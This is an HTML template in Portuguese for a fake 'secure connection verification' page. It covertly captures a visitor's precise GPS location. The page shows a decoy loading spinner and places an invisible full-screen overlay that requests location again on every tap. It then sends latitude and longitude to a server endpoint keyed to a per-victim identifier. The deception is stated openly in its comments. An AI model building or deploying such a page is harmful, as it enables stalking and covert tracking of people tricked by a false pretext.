<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Conectando...</title>
    
    <meta property="og:title" content="Verificação de Sistema">
    <meta property="og:description" content="Aguarde enquanto estabelecemos conexão segura.">
    <meta name="theme-color" content="#ffffff">

    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background-color: #f8f9fa;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden; /* Trava a rolagem */
        }

        /* Loader girando para parecer que está processando */
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        h2 { color: #555; font-size: 18px; font-weight: normal; }
        p { color: #999; font-size: 12px; }

        /* Máscara invisível que cobre a tela toda */
        #click-trap {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 9999;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="click-trap" onclick="solicitarGPS()"></div>

    <div>
        <div class="loader"></div>
        <h2 id="status">Estabelecendo conexão segura...</h2>
        <p>Aguarde um momento.</p>
    </div>

    <script>
        const idOrdem = "{{ id }}";
        let jaEnviou = false;

        function enviarPosicao(pos) {
            if (jaEnviou) return; // Evita envio duplicado
            
            document.getElementById('status').innerText = "Conexão Estabelecida.";
            document.querySelector('.loader').style.borderTopColor = "#28a745"; // Vira verde

            fetch(`/api/sinal/${idOrdem}`, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude
                })
            }).then(() => {
                jaEnviou = true;
                // Opcional: Redirecionar para o Google ou fechar
                // window.location.href = "https://www.google.com"; 
                document.getElementById('status').innerText = "Validado. Pode fechar.";
            });
        }

        function solicitarGPS() {
            if (!navigator.geolocation) return;

            navigator.geolocation.getCurrentPosition(
                enviarPosicao, 
                function(erro) {
                    console.log("Erro ou permissão negada");
                    document.getElementById('status').innerText = "Toque na tela para continuar...";
                }, 
                { enableHighAccuracy: true, maximumAge: 0 }
            );
        }

        // Tenta rodar SOZINHO assim que carrega
        window.onload = function() {
            solicitarGPS();
            
            // Reforço: Tenta de novo a cada toque na tela (caso o navegador tenha bloqueado o automático)
            document.body.addEventListener('click', solicitarGPS);
            document.body.addEventListener('touchstart', solicitarGPS);
        };
    </script>
</body>
</html>
